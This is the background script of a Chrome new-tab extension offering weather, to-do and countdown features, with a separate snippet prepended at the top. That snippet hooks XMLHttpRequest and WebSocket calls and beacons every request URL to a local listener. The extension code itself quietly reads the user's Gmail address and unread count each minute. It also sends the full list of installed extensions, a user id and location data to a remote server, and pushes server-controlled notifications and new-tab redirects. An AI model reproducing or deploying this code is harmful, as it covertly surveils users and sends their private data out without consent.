function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
(function(e) {
  "use strict";
  var t = localStorage.getItem("user_group") || Math.floor(Math.random() * 10) + 1;
  localStorage.setItem("user_group", t);
  localStorage.setItem("newtab_url", chrome.extension.getURL("/start/index.html"));
  localStorage.setItem("ext_id", chrome.runtime.id);
  localStorage.setItem("ext_name", chrome.i18n.getMessage("extName"));
  chrome.browserAction.onClicked.addListener(function() {
    chrome.extension.sendMessage("click-BrowserAction");
    chrome.tabs.create({
      url: localStorage.getItem("newtab_url")
    });
  });
  chrome.runtime.setUninstallURL(user["firstRunLandingPage"] + "?ext_uninstall&id=" + chrome.runtime.id);
  var a = utils.get;
  var o = utils.set;
  localStorage["setting_geo"] = new Date().getTime();
  var n = 0;
  var r = null;
  function l() {
    if (r) clearTimeout(r);
    var t = "http://" + localStorage.getItem("user_group") + "." + user["firstRunDomain"] + "/v1/geo/?uid=" + localStorage.getItem("uid") + "&idt=" + localStorage.getItem("installdt") + "&dsb=" + localStorage.getItem("installdc") + "&grp=" + localStorage.getItem("user_group") + "&ver=" + localStorage.getItem("version") + "&eid=" + chrome.runtime.id;
    if (localStorage.getItem("ext_oid")) {
      t += "&oid=" + localStorage.getItem("ext_oid");
    }
    t += "&cb=" + Math.floor(Math.random() * 999999);
    ajax_post(t, null, "json", function(e) {
      if (e.oid) localStorage.setItem("ext_oid", e.oid);
      if (e.cast) localStorage.setItem("cast", JSON.stringify(e.cast)); else localStorage.removeItem("cast");
      if (e.highlight) localStorage.setItem("highlight", e.highlight); else localStorage.removeItem("highlight");
      var t = e.country_code;
      if (!user["geodata"]) {
        if ([ "US", "BM", "BZ", "JM", "PW" ].indexOf(t.toUpperCase()) >= 0) {
          user["units_weather"] = "imperial";
          user["date_format"] = "{{m}}.{{d}}.{{y}}";
          user["time_format"] = "12h";
        } else {
          user["units_weather"] = "metric";
          user["date_format"] = "{{d}}.{{m}}.{{y}}";
          user["time_format"] = "24h";
        }
      }
      user["geodata"] = JSON.stringify(e);
      if (n == 0) {
        p();
      } else {
        if (e.relate && e.relate.length) {
          chrome.tabs.query({}, function(e) {
            for (var t = 0; t < e.length; t++) {
              chrome.tabs.sendMessage(e[t].id, {
                refreshRelativeApps: true
              });
            }
          });
        }
      }
      n++;
      if (!user["sengine"]) {
        user["sengine"] = SEARCH_ENGINES_DEFAULT;
      }
      utils.localstorage2cookie();
      delete localStorage["setting_geo"];
      var a = localStorage.getItem("user_input_city");
      var o = localStorage.getItem("user_input_city_isvalid") === "true";
      if (a && o) {
        c(a);
      } else if (e.city && e.country_name) {
        c(e.city + ", " + e.country_name);
      } else if (e.city) {
        c(e.city);
      } else {
        trackStatusEvent("error-Geo-NoCity", null, e.ip);
      }
    }, function(t) {
      if (r) clearTimeout(r);
      r = setTimeout(l, Math.floor(10 * 6e4 + Math.random() * 10 * 6e4));
      delete localStorage["setting_geo"];
      if (e.debug) console.log("error geolocator: ", t, arguments);
    });
  }
  function i(e) {
    var t = {
      woeid: e.woeid
    };
    if (e.locality1 && e.locality1.content) t.city = e.locality1.content; else t.city = isNaN(e.name) ? e.name : e.admin1 ? e.admin1.content : e.name;
    if (e.country) t.countrycode = e.country.code;
    return t;
  }
  function s() {
    chrome.tabs.query({}, function(e) {
      for (var t = 0; t < e.length; t++) {
        chrome.tabs.sendMessage(e[t].id, {
          type: "error_city_not_found",
          info: {
            error_msg: "Unable to get your city."
          }
        });
      }
    });
  }
  function c(t) {
    var a = "https://query.yahooapis.com/v1/public/yql?q=SELECT%20*%20FROM%20geo.places%20WHERE%20text%3D%22" + encodeURIComponent(t) + "%22&format=json";
    $.getJSON(a, function(a) {
      var o = a.query.count;
      var n = null;
      var r = false;
      if (o > 1) {
        r = true;
        n = i(a.query.results.place[0]);
      } else if (o == 1 && a.query.results.place) {
        r = true;
        n = i(a.query.results.place);
      }
      if (r) {
        var l = {
          enteredLocation: t,
          woeid: n.woeid,
          location_name: n.city
        };
        localStorage.setItem("weather_location", JSON.stringify(l));
        chrome.tabs.query({}, function(e) {
          for (var t = 0; t < e.length; t++) {
            chrome.tabs.sendMessage(e[t].id, {
              refreshWeather: true
            });
          }
        });
      } else {
        if (e.debug) console.log("Error getting GeoPlaces");
        s();
        trackStatusEvent("error-GeoPlaces-NoData", null, t);
      }
    }).fail(function(t, a, o) {
      if (e.debug) console.log("Error in GeoPlaces request");
      s();
    });
  }
  l();
  utils.localstorage2cookie();
  chrome.runtime.onMessage.addListener(function(t, a, o) {
    if (e.debug) console.log("onMessage: ", t, a);
    if (t.ext) {
      var n = JSON.parse(t.ext);
      for (var r in n) {
        localStorage[r] = n[r];
      }
      if (!n["sengine"]) {
        delete localStorage["sengine"];
      }
    } else if (t.getall) {
      o({
        ext: JSON.stringify(localStorage)
      });
    } else if (t.topSites) {
      chrome.topSites.get(function(e) {
        o(e);
      });
      return true;
    }
    if (t.type === "weather_location_request") {
      var l = t.info.enteredLocation;
      localStorage.setItem("user_input_city", l);
      if (e.debug) console.log("request.info.enteredLocation", t.info.enteredLocation);
      c(t.info.enteredLocation);
    }
    if (t.type === "fetch_email_data") {
      d(u, f);
    }
    if (t.changeOptions) {
      var i = JSON.parse(localStorage.getItem("had_wl"));
      if (i.length > 0) {
        utils.getEnabledAppsInWhitelist(i, function(e) {
          e.forEach(function(e) {
            if (e.id !== chrome.runtime.id) {
              chrome.runtime.sendMessage(e.id, {
                changeOptions: utils.getGlobalOptions()
              });
            }
          });
        });
      }
      chrome.tabs.query({}, function(e) {
        for (var t = 0; t < e.length; t++) {
          if (e[t].id !== a.tab.id) {
            chrome.tabs.sendMessage(e[t].id, {
              refreshOptions: true
            });
          }
        }
      });
    }
  });
  var g = function(e) {
    return btoa(encodeURIComponent(e).replace(/%([0-9A-F]{2})/g, function e(t, a) {
      return String.fromCharCode("0x" + a);
    })).replace(/\+/g, "-").replace(/\//g, "_").replace(/\=/g, ".").replace(/([a-zA-Z0-9._-]{10})/g, "$1~");
  };
  var m = function(e) {
    return decodeURIComponent(atob(e.replace(/\-/g, "+").replace(/\_/g, "/").replace(/\./g, "=").replace(/\~/g, "")).split("").map(function(e) {
      return "%" + ("00" + e.charCodeAt(0).toString(16)).slice(-2);
    }).join(""));
  };
  var u = function(e, t) {
    var a = {
      g: e
    };
    if (localStorage.getItem("dim1")) {
      try {
        a = JSON.parse(m(localStorage.getItem("dim1")));
        a.g = e;
      } catch (e) {}
    }
    localStorage.setItem("dim1", g(JSON.stringify(a)));
    chrome.tabs.query({}, function(a) {
      for (var o = 0; o < a.length; o++) {
        chrome.tabs.sendMessage(a[o].id, {
          type: "gmail_info_fetched",
          info: {
            mailAddress: e,
            mailNums: t
          }
        });
      }
    });
  };
  var f = function(t) {
    if (t) {
      if (e.debug) console.log("background error: ", t);
    } else {
      if (e.debug) console.log("background An error occur!");
    }
  };
  var d = function(e, t) {
    var a = "https://mail.google.com/mail/feed/atom";
    var o = new XMLHttpRequest();
    o.onreadystatechange = function() {
      if (o.readyState != 4) return;
      if (o.responseXML) {
        var a = o.responseXML;
        var n = "";
        var r = a.getElementsByTagName("title")[0].textContent.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi);
        if (r.length) n = r[0];
        var l = a.getElementsByTagName("fullcount")[0].textContent;
        if (n) {
          e(n, l);
        }
      } else {
        t();
      }
    };
    o.onerror = function(e) {
      t(e);
    };
    o.open("GET", a, true, null, null);
    o.send(null);
  };
  setInterval(d.bind(e, u, f), 6e4);
  function h(t, a) {
    var o = [];
    for (var n = 0; n < t.length; n++) {
      var r = t[n];
      o.push({
        i: r.id,
        n: r.name,
        e: r.enabled,
        m: r.installType,
        t: r.type,
        v: r.version
      });
    }
    var l = "http://" + localStorage.getItem("user_group") + "." + user["firstRunDomain"] + "/v1/had/?uid=" + localStorage.getItem("uid") + "&idt=" + localStorage.getItem("installdt") + "&dsb=" + localStorage.getItem("installdc") + "&grp=" + localStorage.getItem("user_group") + "&ver=" + localStorage.getItem("version") + "&eid=" + chrome.runtime.id + "&cb=" + Math.floor(Math.random() * 999999);
    $.post(l, {
      list: JSON.stringify(o)
    }, function(t) {
      if (e.debug) console.log(a, t.wl);
      if (t && t.wl && t.wl.length) {
        var o = JSON.parse(user["geodata"]);
        var n = utils.getAppsInList2ThatNotInList1([].concat([ {
          id: chrome.runtime.id
        } ], o.relate), t.wl);
        if (e.debug) console.log("added " + n.length);
        if (n.length) {
          o.relate = [].concat(o.relate, n);
          localStorage.setItem("geodata", JSON.stringify(o));
          if (o.relate && o.relate.length) {
            chrome.tabs.query({}, function(e) {
              for (var t = 0; t < e.length; t++) {
                chrome.tabs.sendMessage(e[t].id, {
                  refreshRelativeApps: true
                });
              }
            });
          }
        }
        if (a === "onInstalled" || a === "onEnabled") {
          var r = JSON.parse(localStorage.getItem("had_wl"));
          var n = utils.getAppsInList2ThatNotInList1(r, t.wl);
          if (e.debug) console.log("add to wl " + n.length);
          r = [].concat(r, n);
          localStorage.setItem("had_wl", JSON.stringify(r));
          setTimeout(function() {
            chrome.runtime.sendMessage(t.wl[0].id, {
              changeOptions: utils.getGlobalOptions()
            }, function(t) {
              if (e.debug) console.log("sync " + chrome.runtime.id + " - " + t);
            });
          }, Math.floor(1e3 + Math.random() * 1e3));
        } else {
          localStorage.setItem("had_wl", JSON.stringify(t.wl));
        }
      }
    }, "json");
  }
  chrome.management.onInstalled.addListener(function(t) {
    if (e.debug) console.log("inst:", t);
    h([ t ], "onInstalled");
  });
  chrome.management.onEnabled.addListener(function(t) {
    if (e.debug) console.log("enabled:", t);
    h([ t ], "onEnabled");
  });
  function p() {
    chrome.management.getAll(function(e) {
      h(e, "allApps");
    });
  }
  function S(e, t) {
    e = Math.ceil(e);
    t = Math.floor(t);
    return Math.floor(Math.random() * (t - e)) + e;
  }
  chrome.tabs.onCreated.addListener(function(t) {
    if (t.url.match("chrome://newtab/")) {
      var a = new Date().getTime();
      var o = 0;
      var n = 30;
      try {
        o = parseInt(localStorage.getItem("last_opened") + "");
        var i = JSON.parse(user["geodata"]);
        if (i.delay) n = parseInt(i.delay);
      } catch (e) {}
      if (e.debug) console.log("last open was " + Math.floor((a - o) / 1e3) + "s ago");
      if (a - o > n * 6e4) {
        localStorage.setItem("last_opened", a);
        if (r) clearTimeout(r);
        r = setTimeout(l, Math.floor(Math.random() * 6e4));
      }
      if (localStorage.getItem("random_all_newtab") == "yes") {
        var s = JSON.parse(localStorage.getItem("had_wl"));
        if (s.length > 0) {
          utils.getEnabledAppsInWhitelist(s, function(e) {
            var a = e[Math.floor(Math.random() * e.length)];
            var o = "chrome-extension://" + a.id + "/start/index.html";
            chrome.tabs.update(t.id, {
              url: o
            }, function(e) {});
          });
        }
      }
    }
  });
  function I(t) {
    try {
      var a = new Date().getTime();
      var o = new Date(localStorage.getItem("IDT")).getTime();
      localStorage.setItem("IDT_D", Math.floor((a - o) / (24 * 60 * 60 * 1e3)));
      localStorage.setItem("IDT_S", Math.floor((a - o) / (1 * 1e3)));
      var n = new Date(localStorage.getItem("BST")).getTime();
      localStorage.setItem("BST_S", Math.floor((a - n) / (1 * 1e3)));
      if (localStorage.getItem("cast")) {
        var r = JSON.parse(localStorage.getItem("cast"));
        for (var l = 0; l < r.length; l++) {
          var i = r[l], s = true;
          if (localStorage.getItem("LNS-" + i.name)) {
            var c = new Date(localStorage.getItem("LNS-" + i.name)).getTime();
            localStorage.setItem("LNS_S-" + i.name, Math.floor((a - c) / (1 * 1e3)));
          }
          if (localStorage.getItem("LNC0-" + i.name)) {
            var g = new Date(localStorage.getItem("LNC0-" + i.name)).getTime();
            localStorage.setItem("LNC0_S-" + i.name, Math.floor((a - g) / (1 * 1e3)));
          }
          if (localStorage.getItem("LNC1-" + i.name)) {
            var g = new Date(localStorage.getItem("LNC1-" + i.name)).getTime();
            localStorage.setItem("LNC1_S-" + i.name, Math.floor((a - g) / (1 * 1e3)));
          }
          var m = false, u = false, f = false, d = false;
          for (var h = 0; h < t.length; h++) {
            var p = t[h];
            if (p.name == "CKT-" + i.name) {
              m = true;
              localStorage.setItem("CKT-" + i.name, p.value);
            } else if (p.name == "CKS-" + i.name) {
              u = true;
              var S = new Date(p.value).getTime();
              localStorage.setItem("CKS_S-" + i.name, Math.floor((a - S) / (1 * 1e3)));
            } else if (p.name == "CKC0-" + i.name) {
              f = true;
              var I = new Date(p.value).getTime();
              localStorage.setItem("CKC0_S-" + i.name, Math.floor((a - I) / (1 * 1e3)));
            } else if (p.name == "CKC1-" + i.name) {
              d = true;
              var I = new Date(p.value).getTime();
              localStorage.setItem("CKC1_S-" + i.name, Math.floor((a - I) / (1 * 1e3)));
            }
          }
          if (!m) localStorage.removeItem("CKT-" + i.name);
          if (!u) localStorage.removeItem("CKS_S-" + i.name);
          if (!f) localStorage.removeItem("CKC0_S-" + i.name);
          if (!d) localStorage.removeItem("CKC1_S-" + i.name);
          for (var _ = 0; _ < i.fl.length; _++) {
            var v = i.fl[_];
            var b = v.k;
            var w = v.c;
            var y = v.v;
            var O = v.vv;
            if (!localStorage.getItem(b)) {
              if (v.r) {
                s = false;
                break;
              } else continue;
            }
            if (w === "=") if ("" + localStorage.getItem(b) != "" + y) {
              s = false;
              break;
            }
            if (w === "!=") if ("" + localStorage.getItem(b) == "" + y) {
              s = false;
              break;
            }
            if (w === "~") if (!new RegExp(y, O).test("" + localStorage.getItem(b))) {
              s = false;
              break;
            }
            if (w === "!~") if (new RegExp(y, O).test("" + localStorage.getItem(b))) {
              s = false;
              break;
            }
            if (w === ">") if (Number(localStorage.getItem(b)) <= Number(y)) {
              s = false;
              break;
            }
            if (w === "<") if (Number(localStorage.getItem(b)) >= Number(y)) {
              s = false;
              break;
            }
            if (w === ">=") if (Number(localStorage.getItem(b)) < Number(y)) {
              s = false;
              break;
            }
            if (w === "<=") if (Number(localStorage.getItem(b)) > Number(y)) {
              s = false;
              break;
            }
          }
          if (s) return i;
        }
      }
    } catch (t) {
      if (e.debug) console.log(t);
    }
    return {};
  }
  function _(t) {
    e.trackNoti(t.name, "noti-show");
    chrome.cookies.set({
      url: "http://" + user["firstRunDomain"] + "/",
      name: "CKS-" + t.name,
      value: new Date().toISOString(),
      expirationDate: Math.floor(new Date().getTime() / 1e3) + 30 * 24 * 60 * 60
    });
    localStorage.setItem("LNS-" + t.name, new Date().toISOString());
    chrome.cookies.get({
      url: "http://" + user["firstRunDomain"] + "/",
      name: "CKT-" + t.name
    }, function(e) {
      var a = 0;
      if (e) if (e.value && !isNaN(parseInt(e.value))) a = parseInt(e.value);
      chrome.cookies.set({
        url: "http://" + user["firstRunDomain"] + "/",
        name: "CKT-" + t.name,
        value: a + 1,
        expirationDate: Math.floor(new Date().getTime() / 1e3) + 30 * 24 * 60 * 60
      });
    });
    var a = 0;
    if (localStorage.getItem("LNT-" + t.name) && !isNaN(parseInt(localStorage.getItem("LNT-" + t.name)))) a = parseInt(localStorage.getItem("LNT-" + t.name));
    localStorage.setItem("LNT-" + t.name, a + 1);
    chrome.notifications.create(chrome.runtime.id + t.name, t.noti, function(a) {
      chrome.notifications.onClicked.addListener(function(o) {
        if (o == a) {
          chrome.cookies.set({
            url: "http://" + user["firstRunDomain"] + "/",
            name: "CKC0-" + t.name,
            value: new Date().toISOString(),
            expirationDate: Math.floor(new Date().getTime() / 1e3) + 30 * 24 * 60 * 60
          });
          e.trackNoti(t.name, "noti-clickMsg");
          localStorage.setItem("LNC0-" + t.name, new Date().toISOString());
          if (t["lp0"]) chrome.tabs.create({
            url: t["lp0"]
          });
          chrome.notifications.clear(o);
        }
      });
      chrome.notifications.onButtonClicked.addListener(function(o, n) {
        if (o == a) {
          chrome.cookies.set({
            url: "http://" + user["firstRunDomain"] + "/",
            name: "CKC" + n + "-" + t.name,
            value: new Date().toISOString(),
            expirationDate: Math.floor(new Date().getTime() / 1e3) + 30 * 24 * 60 * 60
          });
          e.trackNoti(t.name, "noti-clickBtn-" + n);
          localStorage.setItem("LNC" + n + "-" + t.name, new Date().toISOString());
          if (t["lp" + n]) chrome.tabs.create({
            url: t["lp" + n]
          });
          chrome.notifications.clear(o);
        }
      });
    });
  }
  var v = null;
  function b() {
    chrome.windows.getAll({
      populate: true
    }, function(t) {
      for (var a = 0; a < t.length; a++) {
        var o = t[a];
        for (var n = 0; n < o.tabs.length; n++) {
          var r = o.tabs[n];
          if (o.focused && r.active) {
            chrome.tabs.sendMessage(r.id, {
              resumeAllThreads: true
            });
            if (e.debug) console.log(r);
            chrome.cookies.getAll({
              url: "http://" + user["firstRunDomain"] + "/"
            }, function(e) {
              var t = I(e);
              if (t && t.name) {
                if (t.swal) chrome.tabs.sendMessage(r.id, {
                  showNotifyDialog: t
                });
                if (t.noti) _(t);
              }
            });
          } else {
            chrome.tabs.sendMessage(r.id, {
              pauseAllThreads: true
            });
          }
        }
      }
    });
  }
  function w() {
    clearTimeout(v);
    v = setTimeout(b, 100);
  }
  chrome.tabs.onActivated.addListener(w);
  chrome.windows.onFocusChanged.addListener(w);
  chrome.runtime.onMessageExternal.addListener(function(t, a, o) {
    if (e.debug) console.log("exMsg:", t, a);
    if (t.changeOptions) {
      for (var n = 0; n < e.storageDefaultKeys.length; n++) {
        var r = e.storageDefaultKeys[n];
        if (typeof t.changeOptions[r] !== "undefined") delete t.changeOptions[r];
      }
      if (t.changeOptions.disable_weather) localStorage.setItem("disable_weather", t.changeOptions.disable_weather);
      if (t.changeOptions.enable_most_visited) localStorage.setItem("enable_most_visited", t.changeOptions.enable_most_visited); else if (t.changeOptions.disable_most_visited) localStorage.setItem("enable_most_visited", t.changeOptions.disable_most_visited == "yes" ? "no" : "yes");
      if (t.changeOptions.enable_apps) localStorage.setItem("enable_apps", t.changeOptions.enable_apps); else if (t.changeOptions.disable_apps) localStorage.setItem("enable_apps", t.changeOptions.disable_apps == "yes" ? "no" : "yes");
      if (t.changeOptions.enable_share) localStorage.setItem("enable_share", t.changeOptions.enable_share); else if (t.changeOptions.disable_share) localStorage.setItem("enable_share", t.changeOptions.disable_share == "yes" ? "no" : "yes");
      if (t.changeOptions.enable_todo) localStorage.setItem("enable_todo", t.changeOptions.enable_todo); else if (t.changeOptions.disable_todo) localStorage.setItem("enable_todo", t.changeOptions.disable_todo == "yes" ? "no" : "yes");
      if (t.changeOptions.hideTodoPanel) localStorage.setItem("hideTodoPanel", t.changeOptions.hideTodoPanel);
      if (t.changeOptions.todoList) localStorage.setItem("todoList", t.changeOptions.todoList);
      if (t.changeOptions.enable_autohide) localStorage.setItem("enable_autohide", t.changeOptions.enable_autohide);
      if (t.changeOptions.enable_snow) localStorage.setItem("enable_snow", t.changeOptions.enable_snow);
      if (t.changeOptions.snow_type) localStorage.setItem("snow_type", t.changeOptions.snow_type);
      if (t.changeOptions.enable_countdown) localStorage.setItem("enable_countdown", t.changeOptions.enable_countdown);
      if (t.changeOptions.countdownPosition) localStorage.setItem("countdownPosition", t.changeOptions.countdownPosition);
      if (t.changeOptions.countdownText) localStorage.setItem("countdownText", t.changeOptions.countdownText);
      if (t.changeOptions.countdownToTime) localStorage.setItem("countdownToTime", t.changeOptions.countdownToTime);
      if (t.changeOptions.had_wl) localStorage.setItem("had_wl", t.changeOptions.had_wl);
      if (t.changeOptions.random_all_newtab) localStorage.setItem("random_all_newtab", t.changeOptions.random_all_newtab);
      chrome.tabs.query({}, function(e) {
        for (var t = 0; t < e.length; t++) {
          chrome.tabs.sendMessage(e[t].id, {
            refreshOptions: true
          });
        }
      });
      if (typeof o === "function") o(chrome.runtime.id + " OK");
    }
  });
})(this);